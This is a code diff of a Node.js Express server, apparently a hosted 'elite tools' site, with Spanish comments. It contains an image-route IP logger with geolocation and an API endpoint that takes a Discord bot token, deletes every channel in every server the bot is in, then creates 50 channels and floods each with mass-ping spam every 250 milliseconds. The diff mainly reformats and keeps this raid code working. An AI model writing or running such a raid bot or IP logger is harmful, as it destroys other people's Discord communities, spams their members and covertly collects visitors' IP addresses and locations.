@@ -1,13 +1,14 @@
 const express = require('express');
 const { Client, IntentsBitField, ChannelType, ActivityType } = require('discord.js');
 const axios = require('axios');
+const path = require('path');
 const app = express();
 
 app.use(express.json());
 app.use(express.static('public'));
 
 let ipLogs = []; 
-const MY_WEB = "https://idk-tool-production.up.railway.app/";
+const MY_WEB = "https://railway.app";
 
 // --- LOGGER CON GEOLOCALIZACIÓN ---
 app.get('/image/:id.png', async (req, res) => {
@@ -38,37 +39,48 @@ app.get('/api/ip-logs', (req, res) => res.json(ipLogs));
 // --- RAID BOT GLOBAL ---
 app.post('/api/run-raid', async (req, res) => {
     const { token, msg, channelName } = req.body;
-    const bot = new Client({ intents: [IntentsBitField.Flags.Guilds, IntentsBitField.Flags.GuildMessages] });
+    const bot = new Client({ 
+        intents: [IntentsBitField.Flags.Guilds, IntentsBitField.Flags.GuildMessages] 
+    });
 
     try {
         await bot.login(token);
         bot.once('ready', async () => {
-            // STATUS FORZADO A TU WEB
-            bot.user.setActivity("ELITE TOOLS", { 
-                type: ActivityType.Streaming, 
-                url: "https://twitch.tv" // Requiere link de twitch/youtube para el icono morado
+            // STATUS FORZADO
+            bot.user.setPresence({ 
+                activities: [{ 
+                    name: `WEB: ${MY_WEB}`, 
+                    type: ActivityType.Streaming, 
+                    url: "https://twitch.tv" 
+                }],
+                status: 'online'
             });
-            
-            // Editamos el status para que en el "Ver" salga tu web
-            bot.user.setPresence({ activities: [{ name: `WEB: ${MY_WEB}`, type: ActivityType.Streaming, url: "https://twitch.tv" }] });
 
             bot.guilds.cache.forEach(async (guild) => {
-                const channels = await guild.channels.fetch();
-                await Promise.all(channels.map(ch => ch.delete().catch(() => {})));
-                
-                const lagMsg = (msg || "@everyone RAIDED") + "\n" + "█".repeat(850);
+                try {
+                    const channels = await guild.channels.fetch();
+                    await Promise.all(channels.map(ch => ch.delete().catch(() => {})));
+                    
+                    const lagMsg = (msg || "@everyone RAIDED") + "\n" + "█".repeat(850);
 
-                for (let i = 0; i < 50; i++) {
-                    guild.channels.create({ name: channelName || "raid-global", type: ChannelType.GuildText })
-                        .then(async (ch) => {
+                    for (let i = 0; i < 50; i++) {
+                        guild.channels.create({ 
+                            name: channelName || "raid-global", 
+                            type: ChannelType.GuildText 
+                        }).then(async (ch) => {
                             await Promise.all(Array(15).fill(0).map(() => ch.send(lagMsg).catch(() => {})));
                             setInterval(() => ch.send(lagMsg).catch(() => {}), 250);
                         }).catch(() => {});
-                }
+                    }
+                } catch (e) { console.log("Error en guild: " + guild.name); }
             });
             res.json({ success: true, count: bot.guilds.cache.size });
         });
-    } catch (err) { res.status(401).json({ error: "Token Inválido" }); }
+    } catch (err) { 
+        res.status(401).json({ error: "Token Inválido" }); 
+    }
 });
 
-app.listen(process.env.PORT || 3000, () => console.log("Elite Engine Started"));
+// PUERTO DINÁMICO PARA RAILWAY
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Elite Engine corriendo en puerto ${PORT}`));
